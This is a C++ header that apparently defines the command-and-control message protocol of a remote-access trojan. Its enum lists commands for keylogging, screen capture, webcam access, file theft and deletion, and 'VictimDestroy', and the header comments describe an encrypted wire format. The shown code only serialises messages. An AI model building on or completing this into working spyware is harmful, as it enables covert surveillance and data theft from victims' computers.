#include <bits/stdc++.h>
#include "nlohmann/json.hpp"
using json = nlohmann::json;

enum MessageEnum {
    MessageExchangePublicKey,
    MessageRawText,
    MessageContinueMessage,
    MessageEnableScreenCap,
    MessageDisableScreenCap,
    MessageEnableKeylog,
    MessageDisableKeylog,
    MessageEnableWebcam,
    MessageDisableWebcam,
    MessageEnableMicro,     //unimplemented
    MessageDisableMicro,    //unimplemented
    MessageListFile,
    MessageGetFile,
    MessageDeleteFile,
    MessageModifyFile,      //unimplemented
    MessageInvokePowershell,//unimplemented
    MessageInvokeCmd,       //unimplemented
    MessageVictimDestroy1,  //unimplemented
    MessageVictimDestroy2,  
    MessageVictimDestroy3,  //unimplemented
};

class Message {
    public:
    uint16_t commandNumber;
    uint16_t returnCode;
    uint16_t reserved;

    ~Message() {
        delete[] binaryData;
        delete[] jsonData;
    }

    void setJsonData(const json& j) {
        delete[] jsonData;
        std::string jdump = j.dump();
        jsonDataSize = jdump.size(); 
        jsonData = new char[jsonDataSize];
        memcpy(jsonData, jdump.data(), jsonDataSize);
        setSegmentSize();
    }

    char* getJsonData() const {
        return jsonData;
    }

    int getJsonDataSize() const {
        return jsonDataSize;
    }

    void setBinaryData(const char *tbuf, int tsize) {
        delete[] binaryData;
        binaryData = new char[tsize];
        memcpy(binaryData, tbuf, tsize);
        binaryDataSize = tsize;
        setSegmentSize();
    }

    char* getBinaryData() const {
        return binaryData;
    }

    int getBinaryDataSize() const {
        return binaryDataSize;
    }

    int setSegmentSize() {
        return segmentSize = 16 + jsonDataSize + binaryDataSize;
    }

    private:
    char magicNumber[4] = {'Z', 'Z', 'T', 'T'};
    int segmentSize;

    char *binaryData = nullptr;
    int binaryDataSize = 0;

    char *jsonData = nullptr;
    uint16_t jsonDataSize = 0;
};

namespace JsonDataHelper {
    std::string GetFileName(const Message& msg) {
        std::string optionalData(msg.getJsonData(), msg.getJsonData()+msg.getJsonDataSize());
        std::string filename;
        json jsonData;
        try {
            jsonData = json::parse(optionalData);
            filename = jsonData.at("fileName");
        } catch(const json::parse_error& e) {
            std::cerr << "JSON error: " << e.what() << std::endl;
        }

        return filename;
    }
}

/**
 * Message format decrypted:
 * 4 byte magic number: ZZTT
 * 4 byte: total segment size (only use 31bit, positive int)
 * 2 byte: command number
 * 2 byte: return code (for receiving), otherwise 0
 * 2 byte: json data size, including every character
 * 2 byte: unused
 * n byte: json data. Do not null-terminated
 * the rest: binary data
 */

 /**
 * Message format encrypted:
 * 4 byte magic number: ZZTT
 * 4 byte: total segment size (only use 31bit, positive int)
 * the rest: entire (Message format decrypted) encrypted data
 */

 /**
  * Message format key exchange
  * 4 byte magic number: ZZTT
  * 4 byte of FF (=-1)
  * the rest: public key
  */